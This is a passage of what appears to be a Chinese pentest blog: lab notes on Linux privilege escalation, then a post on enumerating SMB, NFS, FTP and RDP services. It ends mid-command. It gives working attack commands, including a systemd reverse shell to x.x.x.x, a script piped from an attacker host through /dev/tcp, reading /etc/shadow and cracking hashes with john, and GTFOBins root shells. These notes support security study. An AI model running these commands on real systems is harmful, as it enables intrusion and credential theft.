命令执行的所有命令及其相关的执行权限。这些权限通常由系统管理员设置。<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">id<br><span class="hljs-attribute">uid</span>=1001(karen) <span class="hljs-attribute">gid</span>=1001(karen) <span class="hljs-attribute">groups</span>=1001(karen)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd|grep home<br>返回所有用户，其中一些是系统或服务用户不是很有用,此命令可以返回拥有他们的home目录下的文件夹的用户信息<br><span class="hljs-built_in">cat</span> /etc/passwd|<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 1<br>剪切并转换为暴力攻击的有用列表<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ip route <span class="hljs-comment">//查看路由</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -s：按协议列出网络使用情况统计信息<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat <span class="hljs-punctuation">-</span>i：显示接口统计信息。 <span class="hljs-comment">//每个网卡的流量统计 重点看RX-OK参数</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> . -name flag1.txt：.txt在 当前目录<br><span class="hljs-built_in">find</span> /home -name flag1.txt：在 中找到文件名“flag1.txt” /home 目录<br><span class="hljs-built_in">find</span> / -type d -name config：在“/”下找到名为<span class="hljs-built_in"> config </span>的目录<br><span class="hljs-built_in">find</span> / -type f -perm 0777：查找具有 777 权限的文件 （所有用户可读、可写和可执行的文件）<br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">a</span>=x：查找可执行文件<br><span class="hljs-built_in">find</span> /home -user frank：在用户“Frank”下查找用户“Frank”的所有文件 “/家”<br><span class="hljs-built_in">find</span> / -mtime 10：查找最近 10 个修改的文件 日<br><span class="hljs-built_in">find</span> / -atime 10：查找最近 10 个中访问过的文件 日<br><span class="hljs-built_in">find</span> / -cmin -60：查找过去一小时内更改的文件 （60 分钟）<br><span class="hljs-built_in">find</span> / -amin -60：查找过去一小时内访问的文件 （60 分钟）<br><span class="hljs-built_in">find</span> / -size 50M：查找大小为 50 MB 的文件<br><br><span class="hljs-built_in">find</span> / -writable -type d 2&gt;/dev/<span class="hljs-literal">null</span> : <span class="hljs-built_in">Find</span> world-writeable folders<br><span class="hljs-built_in">find</span> / -perm -222 -type d 2&gt;/dev/<span class="hljs-literal">null</span>: <span class="hljs-built_in">Find</span> world-writeable folders<br><span class="hljs-built_in">find</span> / -perm -o w -type d 2&gt;/dev/<span class="hljs-literal">null</span>: <span class="hljs-built_in">Find</span> world-writeable folders<br><span class="hljs-built_in">find</span> / -perm -o x -type d 2&gt;/dev/<span class="hljs-literal">null</span> : <span class="hljs-built_in">Find</span> world-executable folders<br><br><span class="hljs-built_in">Find</span> development tools <span class="hljs-keyword">and</span> supported languages:<br><span class="hljs-built_in">find</span> / -name perl*<br><span class="hljs-built_in">find</span> / -name python*<br><span class="hljs-built_in">find</span> / -name gcc*<br><br><br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null  <br><span class="hljs-comment">//查找具有 SUID 的文件，这允许我们以更高的权限级别运行文件 比当前用户。</span><br>SUID （<span class="hljs-keyword">Set</span> User <span class="hljs-comment">ID</span>）是文件权限中的一种特殊标志。如果应用于可执行文件，则当普通用户执行该文件时，该文件将以拥有者或指定用户（或组）的特权运行。这意味着该文件将使用与其所有者相同的权限，而不是用户自己的权限。<br>要设置 SUID 标志，可以使用 <span class="hljs-comment">chmod</span> 命令：<br>chmod <span class="hljs-comment">+s filename</span><br>此命令将为文件 filename 设置 <span class="hljs-comment">SUID</span> 标志。使用相反的符号 <span class="hljs-comment">-s</span> 可以删除 <span class="hljs-comment">SUID</span> 标志。<br>SUID 标志常用于需要系统管理员权限才能执行的程序。例如，<span class="hljs-comment">passwd</span> 命令必须以 <span class="hljs-comment">root</span> 用户的权限运行才能更改密码。因此，<span class="hljs-comment">passwd</span> 可以设置为具有 <span class="hljs-comment">SUID</span> 标志的可执行文件，以使普通用户也能够更改自己的密码。<br></code></pre></td></tr></table></figure><h6 id="自动化枚举工具"><a href="#自动化枚举工具" class="headerlink" title="自动化枚举工具"></a>自动化枚举工具</h6><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a>  sh</p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>本地下载好.sh文件 开python3</p><p>目标机 cd到tmp目录下wget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">或者<br><span class="hljs-built_in">sudo</span> nc -q 5 -lvnp 80 &lt; xxx.sh <span class="hljs-comment">#Host</span><br><span class="hljs-built_in">cat</span> &lt; /dev/tcp/<span class="hljs-variable">$hostip</span>/80 | sh <span class="hljs-comment">#Victim</span><br></code></pre></td></tr></table></figure><h5 id="Privilege-Escalation-Kernel-Exploits"><a href="#Privilege-Escalation-Kernel-Exploits" class="headerlink" title="Privilege Escalation: Kernel Exploits"></a>Privilege Escalation: Kernel Exploits</h5><p>pwnkit    <a href="https://www.cnblogs.com/vpandaxjl/p/15858288.html">https://www.cnblogs.com/vpandaxjl/p/15858288.html</a></p><p>dirtypipe    <a href="https://blog.csdn.net/weixin_45996361/article/details/123379361">https://blog.csdn.net/weixin_45996361/article/details/123379361</a></p><p><a href="https://www.linuxkernelcves.com/cves">https://www.linuxkernelcves.com/cves</a>   Linux Kernel CVEs </p><p><a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a>   exploit-db</p><p>通过内核版本查到对应的cve，在db中查到exp</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">注意：.c后缀的<span class="hljs-built_in">exp</span> 使用<br>gcc --<span class="hljs-keyword">static</span> <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span><br>使用静态链接方式构建您的可执行文件，以便将所需的 GLIBC 版本打包进去。防止使用时缺失版本库<br></code></pre></td></tr></table></figure><p>然后host python3      然后victem：cd &#x2F;tmp、wget 、chmod、.&#x2F;exp 提权</p><h5 id="Privilege-Escalation-Sudo"><a href="#Privilege-Escalation-Sudo" class="headerlink" title="Privilege Escalation: Sudo"></a>Privilege Escalation: Sudo</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> karen on ip<span class="hljs-number">-10</span><span class="hljs-number">-10</span><span class="hljs-number">-188</span><span class="hljs-number">-138</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> karen may run the following commands on ip<span class="hljs-number">-10</span><span class="hljs-number">-10</span><span class="hljs-number">-188</span><span class="hljs-number">-138</span>:<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/find<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/less<br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/nano<br></code></pre></td></tr></table></figure><p>到这个网站上搜索提权命令</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">whoami</span></span><br>root<br></code></pre></td></tr></table></figure><h5 id="Privilege-Escalation-SUID"><a href="#Privilege-Escalation-SUID" class="headerlink" title="Privilege Escalation: SUID"></a>Privilege Escalation: SUID</h5><p>cat &#x2F;etc&#x2F;passwd—&gt;拖回本地<strong>passwd.txt</strong></p><p>&#x2F;&#x2F;查找具有SUID和SGID  的文件，他们执行时暂时具有root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>//find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null 有什么区别？<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a> 找到一个对应的base64,可以读取任意文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=/etc/shadow<br><span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><p>本地复制出来一个shadow.txt，然后</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">unshadow passwd<span class="hljs-selector-class">.txt</span> shadow<span class="hljs-selector-class">.txt</span> &gt; out.txt<br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">john --wordlist=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/wordlists/rockyou</span>.txt <span class="hljs-keyword">out</span>.txt<br>Password1        (karen)     <br>Password1        (user2)     <br>test123          (gerryconway)    <br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;该方法可以解出以上两个其他普通用户的密码，无法root，但是还是可以读取任意文件，读取到了root用户的flag3.txt</p><p>op—suid systemctl 提权</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">写一个服务，这个服务一启动就弹shell<br><span class="hljs-keyword">echo</span> &#x27;[Service]<br>Type=oneshot<br>ExecStart=<span class="hljs-string">/bin/bash</span> -c <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/x.x.x.x/xxx 0&gt;&amp;1 2&lt;&amp;1&quot;</span><br>[Install]<br>WantedBy=multi-user.target&#x27; &gt; mm.service<br><br><span class="hljs-string">///</span>当mm.service在tmp目录下时，无法被systemctl加载。这里需要掌握一个神奇的目录：<span class="hljs-string">/dev/shm/</span><br>cp mm.service <span class="hljs-string">/dev/shm/</span>       <br><span class="hljs-string">//</span>攻击机起监听<br>systemctl link <span class="hljs-string">/dev/shm/mm.service</span><br>systemctl enable <span class="hljs-params">--now</span> <span class="hljs-string">/dev/shm/mm.service</span><br></code></pre></td></tr></table></figure><h5 id="Privilege-Escalation-Capabilities"><a href="#Privilege-Escalation-Capabilities" class="headerlink" title="Privilege Escalation: Capabilities"></a>Privilege Escalation: Capabilities</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><a href="https://gtfobins.github.io/#+capabilities">https://gtfobins.github.io/#+capabilities</a> 查到对应vim利用</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cp $(which <span class="hljs-built_in">view</span>) .<br>sudo setcap cap_setuid+ep <span class="hljs-built_in">view</span><br>./<span class="hljs-built_in">view</span> -c &#x27;:py import os; os.setuid(<span class="hljs-number">0</span>); os.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;reset; exec sh&quot;</span>)&#x27;<br>//以上是原话行不通，修改两个地方（一个<span class="hljs-built_in">view</span>路径，一个py3） 只执行下面这一句话   <span class="hljs-built_in">view</span>有root权限<br>/home/ubuntu/<span class="hljs-built_in">view</span> -c &#x27;:py3 import os; os.setuid(<span class="hljs-number">0</span>); os.execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;reset; exec sh&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><h5 id="Privilege-Escalation-Cron-Jobs"><a href="#Privilege-Escalation-Cron-Jobs" class="headerlink" title="Privilege Escalation: Cron Jobs"></a>Privilege Escalation: Cron Jobs</h5><h5 id="Privilege-Escalation-PATH"><a href="#Privilege-Escalation-PATH" class="headerlink" title="Privilege Escalation: PATH"></a>Privilege Escalation: PATH</h5><p><code>PATH</code> 变量是一个包含一组目录路径的环境变量，用于指示系统在哪里查找可执行文件。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/-%E6%8F%90%E6%9D%83/image-20231016012836758.png" alt="image-20231016012836758"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>每个路径由冒号分隔。当您在终端中输入一个命令时，系统会按照 <code>PATH</code> 变量中的路径顺序依次检查这些目录，直到找到对应的可执行文件或搜索完所有路径。</p><p>&#x2F;&#x2F;这个漏洞赌的是<code>find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</code>的时候能不能找到<strong>不属于系统本身</strong>的可执行文件，系统管理员之前 <code>chmod u+s xxx </code>过，具有suid权限。</p><p><a href="https://blog.csdn.net/weixin_49340699/article/details/118801756">https://blog.csdn.net/weixin_49340699/article/details/118801756</a></p><p>比如说 找到一个可执行文件<code>/home/murdoch/test</code>，并且具有suid属性，查看同文件夹下之前管理员编译后未删除的源代码文件.py后，发现他是在调用一个叫thm的命令，thm这个命令平常的时候会从<code>echo $PATH</code>中路径从前往后找，但是如果这个时候执行了<code>export PATH=/tmp:$PATH</code> (tmp文件夹同样可执行)，系统中调用thm时就会优先从&#x2F;tmp文件夹下寻找，此时这个动作属于root，所以在tmp目录中创建同样名为<code>thm</code>的文件，内容为<code>/bin/bash</code>，<code>./test</code>执行即可提权</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试中的常见端口服务枚举</title>
    <link href="/2023/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE/"/>
    <url>/2023/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE/</url>
    
    <content type="html"><![CDATA[<h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><h6 id="nmap枚举"><a href="#nmap枚举" class="headerlink" title="nmap枚举"></a>nmap枚举</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">445</span> <span class="hljs-attr">--script</span>=smb-enum-shares<span class="hljs-selector-class">.nse</span>,smb-enum-users<span class="hljs-selector-class">.nse</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">21.33</span><br>nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">139</span> <span class="hljs-attr">--script</span>=smb-enum-shares<span class="hljs-selector-class">.nse</span>,smb-enum-users<span class="hljs-selector-class">.nse</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">21.33</span><br></code></pre></td></tr></table></figure><h6 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">smbmap -u guest -H <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span><br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>:<span class="hljs-number">445</span>        <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>                                      <br>        Disk                                      Permissions     <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">----                                     -----------     -------</span><br>        <span class="hljs-keyword">ADMIN</span>$                                    <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Remote <span class="hljs-keyword">Admin</span><br>        C$                                        <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        IPC$                                      <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Remote IPC<br>        Users                                     <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br><br>root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span> -r Users<br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>:<span class="hljs-number">445</span>        <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>                                      <br>        Disk                                       Permissions     <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">----                                      -----------     -------</span><br>        Users                                      <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br>        .\Users\*<br>        dw<span class="hljs-comment">--w--w--                0 Fri May 15 02:57:08 2020    .</span><br>        dw<span class="hljs-comment">--w--w--                0 Fri May 15 02:57:08 2020    ..</span><br>        dw<span class="hljs-comment">--w--w--                0 Sun Apr 19 20:51:00 2020    Default</span><br>        fr<span class="hljs-comment">--r--r--              174 Wed Apr 22 04:18:13 2020    desktop.ini</span><br>        dr<span class="hljs-comment">--r--r--                0 Fri May 15 02:58:07 2020    Share</span><br>        <br>root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span> -r Users/<span class="hljs-keyword">Share</span><br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>:<span class="hljs-number">445</span>        <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>                                      <br>        Disk                                                    Permissions     <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">----                                                    -----------     -------</span><br>        Users                                                   <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br>        .\UsersShare\*<br>        dr<span class="hljs-comment">--r--r--                0 Fri May 15 02:58:07 2020    .</span><br>        dr<span class="hljs-comment">--r--r--                0 Fri May 15 02:58:07 2020    ..</span><br>        fr<span class="hljs-comment">--r--r--            13312 Fri May 15 02:58:07 2020    gatekeeper.exe</span><br>root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span> -r Users/<span class="hljs-keyword">Share</span> -A <span class="hljs-string">&#x27;gate&#x27;</span><br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>:<span class="hljs-number">445</span>        <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.245</span><span class="hljs-number">.39</span>                                      <br>[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">&#x27;gate&#x27;</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> Users.<br>[+] Match <span class="hljs-built_in">found</span>! Downloading: UsersShare\gatekeeper.exe<br></code></pre></td></tr></table></figure><h6 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h6><p>1，枚举列出某个IP地址所提供的共享文件夹</p><p>smbclient -L 198.168.0.1 -U username -W domain (会提示输密码)<br>smbclient -L 198.168.0.1 -U username%password -W domain</p><p>2,像FTP客户端一样使用smbclient<br>smbclient <a href="https://192.168.0.1/tmp">&#x2F;&#x2F;192.168.0.1&#x2F;tmp</a> -U username -W domain (会提示输密码)<br>smbclient <a href="https://192.168.0.1/tmp">&#x2F;&#x2F;192.168.0.1&#x2F;tmp</a> -U username%password -W domain</p><p>扫描出来的结果可以直接<code>smbclient //10.10.21.33/anonymous</code> 连接 </p><p>或者递归下载</p><p><code>smbget -R smb://10.10.21.33/anonymous</code></p><h6 id="通用漏洞"><a href="#通用漏洞" class="headerlink" title="通用漏洞"></a>通用漏洞</h6><p>CVE-2020-0796 SMBv3漏洞（“永恒之黑”）</p><p>ms17-010</p><h4 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h4><h6 id="nmap枚举-1"><a href="#nmap枚举-1" class="headerlink" title="nmap枚举"></a>nmap枚举</h6><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs processing">nmap -T5 -p <span class="hljs-number">111</span> --script=<span class="hljs-built_in">nfs</span>-ls,<span class="hljs-built_in">nfs</span>-showmount <span class="hljs-number">10.10</span><span class="hljs-number">.21</span><span class="hljs-number">.33</span><br><span class="hljs-comment">//还有一个脚本nfs-statfs暂时不能用</span><br></code></pre></td></tr></table></figure><h4 id="pop3"><a href="#pop3" class="headerlink" title="pop3"></a>pop3</h4><h6 id="nmap枚举-2"><a href="#nmap枚举-2" class="headerlink" title="nmap枚举"></a>nmap枚举</h6><p>nmap -sC –script&#x3D;pop3-capabilities,pop3-ntlm-info -sV -p 110 10.10.240.244</p><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h6 id="nmap枚举-3"><a href="#nmap枚举-3" class="headerlink" title="nmap枚举"></a>nmap枚举</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sV -p 21 --script ftp-anon [target host]<br></code></pre></td></tr></table></figure><h6 id="连接-1"><a href="#连接-1" class="headerlink" title="连接"></a>连接</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams">nc监听执行命令 nc <span class="hljs-symbol">$</span>ip <span class="hljs-number">21</span>    <span class="hljs-comment">//能copy啥的</span><br><br>ftp <span class="hljs-symbol">$</span>ip<br>上传 <span class="hljs-keyword">put</span><br>下载 get<br>全部下载 mget *<br>下载前设置二进制传输<br>#<span class="hljs-keyword">binary</span><br>如果在get前不用<span class="hljs-keyword">binary</span>命令讲传输模式设为二进制的话，则会按默认的ASCII方式传输，最终得到的将是一个损坏了的文件。<br>注：需要使用<span class="hljs-keyword">binary</span>方式传输的文件类型有ISO文件、可执行文件、压缩文件、图片等。<br></code></pre></td></tr></table></figure><h6 id="banner-grab"><a href="#banner-grab" class="headerlink" title="banner grab"></a>banner grab</h6><p>nc -nv X.X.X.X 21</p><h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><h6 id="nmap枚举-4"><a href="#nmap枚举-4" class="headerlink" title="nmap枚举"></a>nmap枚举</h6><p>Example Usage</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3389</span> <span class="hljs-attr">--script</span> rdp-enum-encryption &lt;ip&gt;<br></code></pre></td></tr></table></figure><p>Script Output</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT     STATE SERVICE<br><span class="hljs-number">3389</span>/tcp open  ms-wbt-server<br>|   <span class="hljs-type">Security</span> layer<br>|     <span class="hljs-type">CredSSP</span> (NLA): SUCCESS<br>|     <span class="hljs-type">CredSSP</span> <span class="hljs-built_in">with</span> Early User Auth: SUCCESS<br>|     <span class="hljs-type">Native</span> RDP: SUCCESS<br>|     <span class="hljs-type">RDSTLS</span>: SUCCESS<br>|     <span class="hljs-type">SSL</span>: SUCCESS<br>|   <span class="hljs-type">RDP</span> Encryption level: High<br>|     <span class="hljs-type">40</span>-bit RC4: SUCCESS<br>|     <span class="hljs-type">56</span>-bit RC4: SUCCESS<br>|     <span class="hljs-type">128</span>-bit RC4: SUCCESS<br>|     <span class="hljs-type">FIPS</span> <span class="hljs-number">140</span><span class="hljs-number">-1</span>: SUCCESS<br>|<span class="hljs-type">_</span>  RDP Protocol Version:  RDP <span class="hljs-number">5.</span>x, <span class="hljs-number">6.</span>x, <span class="hljs-number">7.</span>x, or <span class="hljs-number">8.</span>x server<br></code></pre></td></tr></table></figure><h6 id="连接-2"><a href="#连接-2" class="headerlink" title="连接"></a>连接</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:username /p:<span 